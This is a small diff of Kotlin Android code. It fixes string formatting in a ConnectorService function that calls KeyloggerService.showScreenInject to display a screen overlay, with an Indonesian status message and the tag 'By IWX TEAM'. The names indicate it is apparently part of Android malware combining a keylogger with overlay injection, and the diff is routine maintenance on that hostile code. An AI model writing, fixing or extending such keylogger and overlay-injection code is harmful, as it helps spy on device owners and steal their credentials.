@@ -880,7 +880,7 @@ class ConnectorService : Service() {
         return try {
             val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
             KeyloggerService.showScreenInject(trimmed)
-            "OK: Overlay ditampilkan — "$trimmed""
+            "OK: Overlay ditampilkan — ${trimmed}"
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
